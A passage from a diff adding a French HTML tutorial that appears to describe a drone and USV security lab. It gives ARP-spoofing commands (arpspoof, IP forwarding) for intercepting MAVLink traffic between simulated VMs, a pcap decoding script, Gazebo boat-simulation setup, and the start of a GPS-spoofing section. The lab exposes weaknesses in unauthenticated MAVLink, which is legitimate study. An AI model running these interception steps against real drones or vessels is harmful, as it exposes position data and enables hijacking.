+        <div><span class="t-out">→ Adaptateur 2  : Réseau hôte uniquement  →  vboxnet0</span></div>
+        <br>
+        <div><span class="t-comment"># ── 3. Fixer l'IP statique dans chaque VM (Ubuntu) ──</span></div>
+        <div><span class="t-comment"># VM 1 — ArduPilot (enp0s8 = 2e carte réseau)</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo ip addr add 192.168.56.101/24 dev enp0s8</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo ip link set enp0s8 up</span></div>
+        <br>
+        <div><span class="t-comment"># VM 2 — QGroundControl</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo ip addr add 192.168.56.102/24 dev enp0s8</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo ip link set enp0s8 up</span></div>
+        <br>
+        <div><span class="t-comment"># VM 3 — Kali Linux (eth1 = 2e carte)</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo ip addr add 192.168.56.3/24 dev eth1</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo ip link set eth1 up</span></div>
+        <br>
+        <div><span class="t-comment"># ── 4. Vérifier la connectivité entre les 3 machines ──</span></div>
+        <div><span class="t-comment"># Depuis Kali, ping les deux autres :</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">ping -c 2 192.168.56.101  &amp;&amp;  ping -c 2 192.168.56.102</span></div>
+        <div><span class="t-out">→ 2 packets transmitted, 2 received  ✓</span></div>
+      </div>
+    </div>
+
+    <h4 class="sub2">Topologie du scénario</h4>
+    <div class="mitm-diagram">
+      <div class="mitm-row">
+        <div class="mitm-node">
+          ArduCopter<br>
+          <span class="mitm-label">192.168.56.101</span>
+        </div>
+        <span class="mitm-arrow">⇄</span>
+        <div class="mitm-node">
+          QGroundControl<br>
+          <span class="mitm-label">192.168.56.102</span>
+        </div>
+      </div>
+      <div style="color:var(--text-dim); font-size:11px; margin:14px 0">
+        ↓ avec ARP spoofing actif ↓
+      </div>
+      <div class="mitm-row">
+        <div class="mitm-node">
+          ArduCopter<br>
+          <span class="mitm-label">192.168.56.101</span>
+        </div>
+        <span class="mitm-arrow">⇄</span>
+        <div class="mitm-node attacker">
+          Kali (attaquant)<br>
+          <span class="mitm-label">192.168.56.3</span>
+        </div>
+        <span class="mitm-arrow">⇄</span>
+        <div class="mitm-node">
+          QGroundControl<br>
+          <span class="mitm-label">192.168.56.102</span>
+        </div>
+      </div>
+    </div>
+
+    <img src="images/img15.png" alt="ARP spoofing " class="img">
+    <div class="img-caption">Fig. 15 — Mise en place</div>
+
+    <h4 class="sub2">Comment fonctionne l'ARP spoofing ?</h4>
+    <p class="prose">
+      ARP (Address Resolution Protocol) associe une adresse IP à une adresse MAC sur le réseau local.
+      Quand ArduCopter veut envoyer un paquet à QGroundControl, il demande « qui a l'IP 192.168.56.102 ? ».
+      L'attaquant répond plus vite que la vraie machine, et fait croire que <em>sa</em> MAC correspond
+      à cette IP. Idem dans l'autre sens.
+    </p>
+
+    <h4 class="sub2">Mise en place côté drone + GCS</h4>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Communication normale (avant attaque)
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">cd ~/ardupilot/ArduCopter</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sim_vehicle.py -v ArduCopter --console --map --out=udp:192.168.56.102:14550</span></div>
+        <br>
+        <div><span class="t-comment"># Sur la machine GCS :</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">./QGroundControl-x86_64.AppImage</span></div>
+      </div>
+    </div>
+
+    <h4 class="sub2">L'attaque ARP côté Kali</h4>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Terminal Kali — Empoisonnement ARP
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-comment"># Activer le forwarding pour ne pas casser le lien</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span></div>
+        <br>
+        <div><span class="t-comment"># Dire à ArduCopter : "QGC est à mon adresse MAC"</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">arpspoof -t 192.168.56.101 192.168.56.102</span></div>
+        <br>
+        <div><span class="t-comment"># Dire à QGC : "ArduCopter est à mon adresse MAC"</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">arpspoof -t 192.168.56.102 192.168.56.101</span></div>
+        <br>
+        <div><span class="t-comment"># Résultat — tables ARP empoisonnées</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">arp -a</span></div>
+      </div>
+    </div>
+
+    <img src="images/img16.png" alt="ARP spoofing en cours" class="img">
+    <div class="img-caption">Fig. 16 — Empoisonnement ARP actif : Kali intercepte tout le trafic MAVLink</div>
+
+    <h4 class="sub2">Capturer le trafic MAVLink intercepté</h4>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Terminal Kali — Capture pcap
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo tcpdump -i eth0 -X 'udp port 14550' -w mavlink_capture.pcap</span></div>
+        <br>
+        <div><span class="t-comment"># Lecture rapide</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">tshark -r mavlink_capture.pcap</span></div>
+      </div>
+    </div>
+
+
+    <h4 class="sub2">Extraire les messages MAVLink avec pymavlink</h4>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Décodage du pcap
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">pip3 install pymavlink</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">nano view_mavlink.py</span></div>
+      </div>
+    </div>
+
+    <div class="code-block">
+<span class="comment">#!/usr/bin/env python3</span>
+from pymavlink import mavutil
+
+pcap = mavutil.mavlink_connection(<span class="str">'mavlink_capture.pcap'</span>, input=False)
+
+count = 0
+while True:
+    msg = pcap.recv_match(blocking=False)
+    if msg is None:
+        break
+    print(f<span class="str">"#{count} [{msg.get_type()}]"</span>, msg)
+    count += 1
+
+print(f<span class="str">"Total : {count} messages MAVLink"</span>)
+    </div>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Exécution
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">python3 view_mavlink.py</span></div>
+      </div>
+    </div>
+
+    <h4 class="sub2">Messages identifiés dans la capture</h4>
+    <p class="prose">
+      Le décodage révèle l'ensemble de la télémétrie en clair : position, vitesse, état système,
+      mission en cours. Un attaquant connaît tout du drone et peut potentiellement injecter
+      n'importe quelle commande.
+    </p>
+
+    <img src="images/img17.png" alt="Capture tcpdump" class="img">
+    <img src="images/img18.png" alt="Capture tcpdump" class="img">
+    <img src="images/img19.png" alt="Capture tcpdump" class="img">
+    <img src="images/img20.png" alt="Capture tcpdump" class="img">
+    <div class="img-caption">Fig. 17 — Trafic MAVLink capturé entre 192.168.56.101 et 192.168.56.102</div>
+
+    <div style="overflow-x:auto">
+      <table class="data-table">
+        <thead>
+          <tr><th>Message</th><th>Information révélée</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><span class="sensor-badge">HEARTBEAT</span></td><td>Type de véhicule, autopilot, mode de vol</td></tr>
+          <tr><td><span class="sensor-badge">GLOBAL_POSITION_INT</span></td><td>Lat/lon/alt précis, vitesse, cap</td></tr>
+          <tr><td><span class="sensor-badge">GPS_RAW_INT</span></td><td>Fix GPS, nombre de satellites</td></tr>
+          <tr><td><span class="sensor-badge">ATTITUDE</span></td><td>Orientation complète du drone</td></tr>
+          <tr><td><span class="sensor-badge">SYS_STATUS</span></td><td>Tension batterie, courant, % restant</td></tr>
+          <tr><td><span class="sensor-badge">MISSION_CURRENT</span></td><td>Waypoint en cours, total mission</td></tr>
+          <tr><td><span class="sensor-badge">VFR_HUD</span></td><td>Altitude, vitesse, throttle</td></tr>
+          <tr><td><span class="sensor-badge">RC_CHANNELS</span></td><td>État des canaux de commande</td></tr>
+          <tr><td><span class="sensor-badge">SERVO_OUTPUT_RAW</span></td><td>Commandes servos / moteurs</td></tr>
+          <tr><td><span class="sensor-badge">NAV_CONTROLLER_OUTPUT</span></td><td>Cap cible, distance waypoint</td></tr>
+          <tr><td><span class="sensor-badge">HOME_POSITION</span></td><td>Point de retour défini</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="alert alert-danger">
+      <strong>Informations critiques accessibles</strong>
+      Position GPS précise (Canberra, lat ~-35.36°, lon ~149.16°) · altitude 100 m · vitesse 10 m/s ·
+      cap 307° · batterie 12.6 V · waypoint 5/19 en cours. <em>Tout</em> est en clair.
+    </div>
+
+  </div>
+</div><!-- end attaques -->
+
+<!-- ═══════════════════════════════════════════════════════════
+     PARTIE 4 — SIMULATION USV
+═══════════════════════════════════════════════════════════ -->
+<div id="usv" class="section">
+
+  <div class="section-header">
+    <div class="section-eyebrow">Partie 04 — USV</div>
+    <h2 class="section-title">Simulation USV en milieu maritime</h2>
+    <p class="section-intro">
+      Le passage de l'UAV au USV implique de simuler un environnement maritime : vagues, vent,
+      courants. Deux niveaux de simulation sont mis en place, une version 2D rapide avec ArduRover SITL
+      configuré en bateau, et une version 3D photoréaliste avec Gazebo Harmonic et le plugin
+      <em>asv_wave_sim</em>. On termine avec une attaque adaptée à ce contexte : le GPS spoofing par
+      dérive progressive.
+    </p>
+  </div>
+
+  <div class="content-area">
+
+    <div class="step-nav" style="grid-template-columns: repeat(3, 1fr)">
+      <a class="step-nav-item" href="#usv-2d">
+        <div class="sn-num">01</div>
+        <div class="sn-label">Simulation</div>
+        <div class="sn-name">USV 2D (rade de Brest)</div>
+      </a>
+      <a class="step-nav-item" href="#usv-3d">
+        <div class="sn-num">02</div>
+        <div class="sn-label">Simulation</div>
+        <div class="sn-name">USV 3D (Gazebo Harmonic)</div>
+      </a>
+      <a class="step-nav-item" href="#usv-drift">
+        <div class="sn-num">03</div>
+        <div class="sn-label">Attaque</div>
+        <div class="sn-name">GPS Spoofing</div>
+      </a>
+    </div>
+
+    <!-- ═════════════════════════════════════════════════════
+         USV 2D — RADE DE BREST
+    ═════════════════════════════════════════════════════ -->
+    <h3 class="subsection" id="usv-2d">Simulation USV 2D — Rade de Brest</h3>
+    <p class="prose">
+      ArduRover supporte un mode <em>boat</em> via la classe de châssis 2 (FRAME_CLASS). On ajoute
+      une location personnalisée dans le fichier des positions de spawn, et on active les paramètres
+      de simulation de vagues et de vent intégrés à SITL.
+    </p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Lancement du SITL Rover en mode bateau
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">cd ~/ardupilot/Rover</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">nano ~/ardupilot/Tools/autotest/locations.txt</span></div>
+        <br>
+        <div><span class="t-comment"># Ajouter la ligne :</span></div>
+        <div><span class="t-out">RadeBrest=48.3339,-4.4797,10,0</span></div>
+        <br>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sim_vehicle.py -v Rover -f rover-skid --map --console -L RadeBrest</span></div>
+      </div>
+    </div>
+
+    <h4 class="sub2">Paramètres de simulation maritime</h4>
+    <p class="prose">
+      Une fois MAVProxy lancé, on configure le châssis en bateau et on active la simulation des
+      vagues et du vent. Ces paramètres sont propres à SITL et n'affectent que la simulation, pas
+      le firmware réel.
+    </p>
+
+    <div class="params-grid">
+      <div class="param-item">
+        <span class="pn">FRAME_CLASS</span> = <span class="pv">2</span>
+        <span class="pd">Boat</span>
+      </div>
+      <div class="param-item">
+        <span class="pn">FRAME_TYPE</span> = <span class="pv">1</span>
+        <span class="pd">Skid steering</span>
+      </div>
+      <div class="param-item">
+        <span class="pn">SIM_WAVE_ENABLE</span> = <span class="pv">1</span>
+        <span class="pd">Activation des vagues</span>
+      </div>
+      <div class="param-item">
+        <span class="pn">SIM_WAVE_AMP</span> = <span class="pv">0.5</span>
+        <span class="pd">Amplitude (m)</span>
+      </div>
+      <div class="param-item">
+        <span class="pn">SIM_WAVE_DIR</span> = <span class="pv">180</span>
+        <span class="pd">Direction (°)</span>
+      </div>
+      <div class="param-item">
+        <span class="pn">SIM_WAVE_LENGTH</span> = <span class="pv">10.0</span>
+        <span class="pd">Longueur d'onde (m)</span>
+      </div>
+      <div class="param-item">
+        <span class="pn">SIM_WAVE_SPEED</span> = <span class="pv">0.5</span>
+        <span class="pd">Vitesse de propagation</span>
+      </div>
+      <div class="param-item">
+        <span class="pn">SIM_WIND_SPD</span> = <span class="pv">5</span>
+        <span class="pd">Vitesse vent (m/s)</span>
+      </div>
+      <div class="param-item">
+        <span class="pn">SIM_WIND_DIR</span> = <span class="pv">270</span>
+        <span class="pd">Direction vent (°)</span>
+      </div>
+      <div class="param-item">
+        <span class="pn">SIM_WIND_TURB</span> = <span class="pv">0.5</span>
+        <span class="pd">Turbulence</span>
+      </div>
+    </div>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; MAVProxy — Configuration et démarrage
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">param set FRAME_CLASS 2</span></div>
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">param set FRAME_TYPE 1</span></div>
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">param set SIM_WAVE_ENABLE 1</span></div>
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">param set SIM_WAVE_AMP 0.5</span></div>
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">param set SIM_WAVE_DIR 180</span></div>
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">param set SIM_WIND_SPD 5</span></div>
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">param set SIM_WIND_DIR 270</span></div>
+        <br>
+        <div><span class="t-comment"># Pas de takeoff pour un USV — directement armer et mode GUIDED</span></div>
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">arm throttle</span></div>
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">mode GUIDED</span></div>
+      </div>
+    </div>
+
+    <img src="images/img21.png" alt="USV en simulation 2D dans la rade de Brest" class="img">
+    <div class="img-caption">Fig. 18 — USV simulé dans la rade de Brest</div>
+
+    <!-- ═════════════════════════════════════════════════════
+         USV 3D — GAZEBO HARMONIC
+    ═════════════════════════════════════════════════════ -->
+    <h3 class="subsection" id="usv-3d">Simulation USV 3D — ArduPilot + Gazebo Harmonic</h3>
+    <p class="prose">
+      Pour une simulation plus réaliste, on couple ArduRover SITL au moteur 3D Gazebo Harmonic.
+      Le plugin <em>asv_wave_sim</em> calcule une surface de mer dynamique en FFT, et le modèle
+      BlueBoat (un USV de Blue Robotics) repose dessus avec son hydrodynamique.
+    </p>
+
+    <h4 class="sub2">1. Préparation du système (Ubuntu 22.04)</h4>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Dépendances de base
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt update &amp;&amp; sudo apt upgrade -y</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt install -y git build-essential cmake python3-pip lsb-release \</span></div>
+        <div><span class="t-prompt">  </span><span class="t-cmd">wget gnupg curl nano mesa-utils</span></div>
+        <br>
+        <div><span class="t-comment"># Dépendances pour les vagues (FFTW, CGAL)</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt install -y libfftw3-dev libcgal-dev</span></div>
+      </div>
+    </div>
+
+    <h4 class="sub2">2. Installation de Gazebo Harmonic</h4>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Ajout du dépôt OSRF et installation
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo wget https://packages.osrfoundation.org/gazebo.gpg \</span></div>
+        <div><span class="t-prompt">  </span><span class="t-cmd">-O /usr/share/keyrings/pkgs-osrf-archive-keyring.gpg</span></div>
+        <br>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/pkgs-osrf-archive-keyring.gpg] \</span></div>
+        <div><span class="t-prompt">  </span><span class="t-cmd">http://packages.osrfoundation.org/gazebo/ubuntu-stable $(lsb_release -cs) main" \</span></div>
+        <div><span class="t-prompt">  </span><span class="t-cmd">| sudo tee /etc/apt/sources.list.d/gazebo-stable.list &gt; /dev/null</span></div>
+        <br>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt update &amp;&amp; sudo apt install -y gz-harmonic</span></div>
+        <br>
+        <div><span class="t-comment"># Test</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">gz sim -v4 shapes.sdf</span></div>
+      </div>
+    </div>
+
+    <img src="images/img22.png" alt="Test Gazebo shapes" class="img">
+    <div class="img-caption">Fig. 19 — Gazebo Harmonic fonctionnel avec le monde de test shapes</div>
+
+    <h4 class="sub2">3. Plugin ArduPilot ↔ Gazebo</h4>
+    <p class="prose">
+      Ce plugin fait le pont entre ArduPilot SITL et Gazebo via JSON sur des sockets UDP.
+    </p>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Compilation du plugin
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt install -y libgz-sim8-dev rapidjson-dev libopencv-dev \</span></div>
+        <div><span class="t-prompt">  </span><span class="t-cmd">libgstreamer1.0-dev libgstreamer-plugins-base1.0-dev \</span></div>
+        <div><span class="t-prompt">  </span><span class="t-cmd">gstreamer1.0-plugins-bad gstreamer1.0-libav gstreamer1.0-gl</span></div>
+        <br>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">export GZ_VERSION=harmonic</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">cd ~ &amp;&amp; git clone https://github.com/ArduPilot/ardupilot_gazebo</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">cd ardupilot_gazebo &amp;&amp; mkdir build &amp;&amp; cd build</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">cmake .. -DCMAKE_BUILD_TYPE=RelWithDebInfo &amp;&amp; make -j4</span></div>
+      </div>
+    </div>
+
+    <h4 class="sub2">4. Plugin de vagues asv_wave_sim</h4>
+    <p class="prose">
+      Sans ce plugin, le bateau tombe à travers l'eau. C'est lui qui simule la surface marine en FFT
+      et applique l'hydrodynamique aux objets flottants.
+    </p>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Compilation avec colcon
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt install -y python3-colcon-common-extensions</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo apt install -y libboost-iostreams-dev libboost-system-dev \</span></div>
+        <div><span class="t-prompt">  </span><span class="t-cmd">libboost-filesystem-dev libboost-thread-dev libboost-program-options-dev</span></div>
+        <br>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">cd ~ &amp;&amp; mkdir -p gz_ws/src &amp;&amp; cd gz_ws/src</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">git clone https://github.com/srmainwaring/asv_wave_sim.git</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">cd ~/gz_ws &amp;&amp; export GZ_VERSION=harmonic</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">colcon build --symlink-install --merge-install --cmake-args -DBUILD_TESTING=OFF</span></div>
+      </div>
+    </div>
+
+    <h4 class="sub2">5. Modèle BlueBoat (SITL_Models)</h4>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Récupération du modèle
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">cd ~ &amp;&amp; git clone https://github.com/ArduPilot/SITL_Models.git</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">ls ~/SITL_Models/Gazebo/models/blueboat/</span></div>
+      </div>
+    </div>
+
+    <h4 class="sub2">6. Variables d'environnement</h4>
+    <p class="prose">
+      Le bloc complet à ajouter dans <code>~/.bashrc</code>, puis <code>source ~/.bashrc</code>.
+    </p>
+
+    <div class="code-block">
+<span class="comment"># ===== ArduPilot + Gazebo Harmonic + asv_wave_sim =====</span>
+
+<span class="comment"># ArduPilot SITL</span>
+export PATH=$PATH:$HOME/ardupilot/Tools/autotest
+source <span class="str">"$HOME/ardupilot/Tools/completion/completion.bash"</span>
+
+<span class="comment"># Plugin ArduPilot Gazebo</span>
+export GZ_SIM_SYSTEM_PLUGIN_PATH=$HOME/ardupilot_gazebo/build
+export GZ_SIM_RESOURCE_PATH=$HOME/ardupilot_gazebo/models:\
+$HOME/ardupilot_gazebo/worlds
+
+<span class="comment"># asv_wave_sim (vagues)</span>
+export GZ_SIM_SYSTEM_PLUGIN_PATH=$HOME/gz_ws/install/lib:${GZ_SIM_SYSTEM_PLUGIN_PATH}
+export LD_LIBRARY_PATH=$HOME/gz_ws/install/lib:${LD_LIBRARY_PATH}
+export GZ_SIM_RESOURCE_PATH=$HOME/gz_ws/src/asv_wave_sim/gz-waves-models/models:\
+$HOME/gz_ws/src/asv_wave_sim/gz-waves-models/world_models:\
+$HOME/gz_ws/src/asv_wave_sim/gz-waves-models/worlds:${GZ_SIM_RESOURCE_PATH}
+
+<span class="comment"># Modèles BlueBoat</span>
+export GZ_SIM_RESOURCE_PATH=$HOME/SITL_Models/Gazebo/models:\
+$HOME/SITL_Models/Gazebo/worlds:${GZ_SIM_RESOURCE_PATH}
+
+<span class="comment"># Rendu logiciel pour VM</span>
+export LIBGL_ALWAYS_SOFTWARE=1
+export MESA_GL_VERSION_OVERRIDE=3.3
+    </div>
+
+    <h4 class="sub2">7. Monde SDF — BlueBoat sur mer</h4>
+    <p class="prose">
+      Le fichier <code>blueboat_waves.sdf</code> définit la scène : physique, plugins, mer, et
+      modèle BlueBoat positionné à l'origine.
+    </p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Création du monde
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">nano ~/gz_ws/src/asv_wave_sim/gz-waves-models/worlds/blueboat_waves.sdf</span></div>
+      </div>
+    </div>
+
+    <div class="code-block">
+&lt;?xml version=<span class="str">"1.0"</span> ?&gt;
+&lt;sdf version=<span class="str">"1.9"</span>&gt;
+  &lt;world name=<span class="str">"blueboat_waves"</span>&gt;
+    &lt;physics name=<span class="str">"1ms"</span> type=<span class="str">"ignored"</span>&gt;
+      &lt;max_step_size&gt;0.002&lt;/max_step_size&gt;
+      &lt;real_time_factor&gt;1.0&lt;/real_time_factor&gt;
+    &lt;/physics&gt;
+
+    &lt;plugin filename=<span class="str">"gz-sim-physics-system"</span>          name=<span class="str">"gz::sim::systems::Physics"</span>/&gt;
+    &lt;plugin filename=<span class="str">"gz-sim-sensors-system"</span>          name=<span class="str">"gz::sim::systems::Sensors"</span>&gt;
+      &lt;render_engine&gt;ogre2&lt;/render_engine&gt;
+    &lt;/plugin&gt;
+    &lt;plugin filename=<span class="str">"gz-sim-scene-broadcaster-system"</span> name=<span class="str">"gz::sim::systems::SceneBroadcaster"</span>/&gt;
+    &lt;plugin filename=<span class="str">"gz-sim-user-commands-system"</span>    name=<span class="str">"gz::sim::systems::UserCommands"</span>/&gt;
+    &lt;plugin filename=<span class="str">"gz-sim-imu-system"</span>              name=<span class="str">"gz::sim::systems::Imu"</span>/&gt;
+
+    &lt;spherical_coordinates&gt;
+      &lt;surface_model&gt;EARTH_WGS84&lt;/surface_model&gt;
+      &lt;world_frame_orientation&gt;ENU&lt;/world_frame_orientation&gt;
+      &lt;latitude_deg&gt;48.3500&lt;/latitude_deg&gt;
+      &lt;longitude_deg&gt;-4.5000&lt;/longitude_deg&gt;
+      &lt;elevation&gt;0&lt;/elevation&gt;
+    &lt;/spherical_coordinates&gt;
+
+    &lt;light type=<span class="str">"directional"</span> name=<span class="str">"sun"</span>&gt;
+      &lt;cast_shadows&gt;true&lt;/cast_shadows&gt;
+      &lt;direction&gt;-0.5 0.1 -0.9&lt;/direction&gt;
+    &lt;/light&gt;
+
+    <span class="comment">&lt;!-- La mer avec vagues FFT --&gt;</span>
+    &lt;include&gt;&lt;uri&gt;model://waves&lt;/uri&gt;&lt;/include&gt;
+
+    <span class="comment">&lt;!-- Le BlueBoat --&gt;</span>
+    &lt;include&gt;
+      &lt;pose degrees=<span class="str">"true"</span>&gt;0 0 0 0 0 90&lt;/pose&gt;
+      &lt;uri&gt;model://blueboat&lt;/uri&gt;
+    &lt;/include&gt;
+  &lt;/world&gt;
+&lt;/sdf&gt;
+    </div>
+
+    <h4 class="sub2">8. Lancement</h4>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Trois terminaux à lancer
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-comment"># Terminal 1 — Gazebo</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">gz sim -v4 -r blueboat_waves.sdf</span></div>
+        <br>
+        <div><span class="t-comment"># Terminal 2 — ArduRover SITL</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sim_vehicle.py -v Rover -f rover-skid --model JSON --console --map</span></div>
+        <br>
+        <div><span class="t-comment"># Terminal 3 — QGroundControl</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">./QGroundControl-x86_64.AppImage</span></div>
+        <br>
+        <div><span class="t-comment"># Dans MAVProxy :</span></div>
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">arm throttle force</span></div>
+      </div>
+    </div>
+
+    <img src="images/img23.png" alt="BlueBoat dans Gazebo avec vagues" class="img">
+    <div class="img-caption">Fig. 20 — BlueBoat naviguant sur une mer Gazebo + asv_wave_sim</div>
+
+    <div class="img-row">
+      <img src="images/img24.png" alt="Vue navigation BlueBoat">
+      <img src="images/img25.png" alt="Trajectoire mission USV">
+    </div>
+    <div class="img-caption">Fig. 21-22 — Navigation et trajectoire de mission de l'USV en mer simulée</div>
+
+    <div class="alert alert-warn">
+      <strong>Outils GPU recommandés</strong>
+      Pour vérifier l'accélération graphique :
+      <code>sudo apt install mesa-utils -y &amp;&amp; glxgears</code>
+    </div>
+
+    <!-- ═════════════════════════════════════════════════════
+         GPS SPOOFING DRIFT
+    ═════════════════════════════════════════════════════ -->
+    <h3 class="subsection" id="usv-drift">Attaque — GPS Spoofing</h3>
+
+    <div class="attack-card">
+      <div class="at-label">Scénario USV</div>
+      <div class="at-title">GPS Attack</div>
+      <div class="at-desc">
+        Une approche différente du spoofing classique. Au lieu de remplacer les données GPS, le script
+        agit au niveau de la <em>navigation</em> : il envoie des consignes <code>SET_POSITION_TARGET_GLOBAL_INT</code>
+        qui dérivent progressivement de la vraie position du véhicule. ArduPilot conserve son GPS
+        authentique mais reçoit en parallèle des cibles falsifiées qui l'attirent peu à peu hors trajectoire.
+      </div>
+    </div>
+
+    <h4 class="sub2">Principe : navigation falsifiée vs sensor spoofing</h4>
+    <p class="prose">
+      Contrairement à l'attaque du scénario 1 où l'on injectait directement de fausses données dans
+      le filtre EKF (avec <code>GPS1_TYPE = 14</code>), ici on ne touche pas au capteur. On exploite
+      simplement le fait que MAVLink accepte des commandes de guidage externe sans authentification.
+    </p>
+
+    <div class="two-col">
